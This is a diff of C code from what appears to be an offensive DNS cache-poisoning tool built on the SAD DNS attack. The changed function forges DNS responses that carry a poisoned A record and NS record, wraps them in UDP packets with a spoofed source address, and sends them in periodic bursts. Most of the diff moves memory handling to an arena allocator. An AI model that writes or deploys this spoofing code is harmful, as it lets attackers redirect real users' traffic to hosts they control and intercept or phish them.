@@ -67,7 +67,7 @@ static void free_chunked_make_args(void* args) {
     free(chunk_args);
 }
 
-bool make_saddns_spoof_chunk(packet_queue_t* queue, void* args) {
+bool make_saddns_spoof_chunk(Arena* arena, packet_queue_t* queue, void* args) {
     chunked_make_args_t* chunk_args = (chunked_make_args_t*)args;
     saddns_task_args_t* task_args = chunk_args->task_info;
 
@@ -79,29 +79,24 @@ bool make_saddns_spoof_chunk(packet_queue_t* queue, void* args) {
     struct dns_answer* answer[1];
     struct dns_answer* authori[1];
 
-    query[0] = new_dns_query_a(task_args->domain_name);
-    answer[0] = new_dns_answer_a(task_args->domain_name, inet_addr(task_args->poison_ip), RES_TTL);
-    authori[0] = new_dns_answer_ns(task_args->domain_name, task_args->poison_ns_name, RES_TTL);
+    query[0] = new_dns_query_a(arena, task_args->domain_name);
+    answer[0] = new_dns_answer_a(arena, task_args->domain_name, inet_addr(task_args->poison_ip), RES_TTL);
+    authori[0] = new_dns_answer_ns(arena, task_args->domain_name, task_args->poison_ns_name, RES_TTL);
 
-    uint8_t* dns_payload = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
+    uint8_t* dns_payload = (uint8_t*)arena_alloc_memory(arena, DNS_PKT_MAX_LEN);
     size_t dns_payload_len = make_dns_packet(dns_payload, DNS_PKT_MAX_LEN, TRUE, 0, query, 1, answer, 1, authori, 1, NULL, 0, TRUE);
 
-    uint8_t* packet_template = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
+    uint8_t* packet_template = (uint8_t*)arena_alloc_memory(arena, DNS_PKT_MAX_LEN);
     size_t packet_raw_len = make_udp_packet(packet_template, DNS_PKT_MAX_LEN,
                                             inet_addr(task_args->src_ip),
                                             inet_addr(task_args->dst_ip),
                                             53, 
                                             task_args->dst_port,
                                             dns_payload, dns_payload_len);
-    
-    free(dns_payload);
-    free_dns_query(query[0]);
-    free_dns_answer(answer[0]);
-    free_dns_answer(authori[0]);
+
 
     if (packet_raw_len == 0) {
         fprintf(stderr, "[-] Failed to create packet template.\n");
-        free(packet_template);
         return false;
     }
 
@@ -112,8 +107,8 @@ bool make_saddns_spoof_chunk(packet_queue_t* queue, void* args) {
             break;
         }
         
-        packet_t* new_pkt = (packet_t*)alloc_memory(sizeof(packet_t));
-        new_pkt->data = (uint8_t*)alloc_memory(packet_raw_len);
+        packet_t* new_pkt = (packet_t*)arena_alloc_memory(arena, sizeof(packet_t));
+        new_pkt->data = (uint8_t*)arena_alloc_memory(arena, packet_raw_len);
         new_pkt->size = packet_raw_len;
         new_pkt->next = NULL;
 
@@ -133,7 +128,6 @@ bool make_saddns_spoof_chunk(packet_queue_t* queue, void* args) {
     
     *(chunk_args->total_packets_sent) += chunk_args->packets_per_chunk;
 
-    free(packet_template);
     return true;
 }
 
@@ -166,15 +160,15 @@ static void spoof_callback_burst(uint16_t port) {
     make_args->total_packets_sent = total_packets_sent;
 
     // 4. 创建 burst 策略，配置为周期性地调用我们的分块函数
-    sender_strategy_t* strategy = create_strategy_burst(
+    sender_strategy_t *strategy = create_strategy_burst(
         make_saddns_spoof_chunk, // 使用分块生成函数
         make_args,               // 传递包含状态的参数
+        free_chunked_make_args, // 释放函数
         NULL,
+        NULL, // 使用默认发送逻辑
         NULL,
-        NULL,                    // 使用默认发送逻辑
-        NULL,
-        0,                       // 立即开始
-        BURST_INTERVAL_MS        // 周期性重复
+        0,                // 立即开始
+        BURST_INTERVAL_MS // 周期性重复
     );
 
     // 5. 设置并启动 sender 执行新策略
